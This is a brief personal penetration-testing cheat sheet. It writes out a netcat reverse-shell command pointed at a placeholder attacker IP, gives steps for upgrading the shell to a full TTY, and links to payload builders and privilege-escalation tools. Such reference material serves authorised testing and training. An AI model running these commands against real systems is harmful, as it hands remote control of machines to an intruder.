This cheatsheet is a compilation of the most used `things` I need when pentesting, I will try to link the refference for the information and give credit where credit is due.

## Reverse shell using netcat

Open listener on attacking machine.
```shell
$ nc -lnvp <Listening_Port>
```

On target machine open the reverse shell to the attacking machine's IP and open port
```shell
$ nc <Attacker_IP> <Attacker_Port> -e /bin/sh
```

> The target machine can open a reverse shell in multiple ways, use [PentestMoneky](http://pentestmonkey.net/) for various reverse shells
> A good PHP reverse shell can be found on [PentestMoneky](https://github.com/pentestmonkey/php-reverse-shell)'s github repo.


## Upgrading a reverse shell

```shell
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In attacking machine
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
```

> Other ways to upgrade a reverse shell can be found [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)


## MSFVenom payloads & more

I've found [PenTest.WS](https://pentest.ws/tools/venom-builder) to have a great online GUI tool to aid in creating MSF Venom payloads.
[PenTest.WS](https://pentest.ws/tools/shells) also contains various other tools like Reverse Shell builder.
I haven't yet used the `+ Create Engagement` option but will most likely have a go at it soon.


## PrivEsc

### Linux

No doubt, the best thing for me has been [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### Windows

For Windows PrivEsc there are multiple things one can use to enumerate and look for PrivEsc options... Here's a few usefull things
* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [Powerless](https://github.com/M4ximuss/Powerless)

Another great tool to use in both PenTest and further enumeration where possible is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
